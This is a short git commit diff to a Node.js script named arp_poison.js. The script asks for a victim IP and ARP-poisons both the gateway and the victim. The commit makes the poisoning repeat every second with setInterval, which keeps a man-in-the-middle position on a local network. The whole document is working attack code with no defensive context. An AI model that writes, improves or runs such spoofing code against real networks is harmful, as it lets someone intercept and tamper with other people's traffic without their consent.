6d00b3d75a576114f0c194cf7dbedf129b5dd1c4
andyjin777 <MacBook-JIN@JINui-MacBook-Pro.local>
2016-08-02 03:19:54 +0900

    update send 1 second

--- arp_poison.js
+++ arp_poison.js
@@ -6,6 +6,8 @@ console.log('Input Victim IP : ');
 var victim_ip = scanf('%s');
 
 network.get_gateway_ip(function(err, ip) {
-	arp.poison(ip, victim_ip);
-	arp.poison(victim_ip, ip);
+	setInterval(function() {
+		arp.poison(ip, victim_ip);
+		arp.poison(victim_ip, ip);
+	}, 1000);
 })
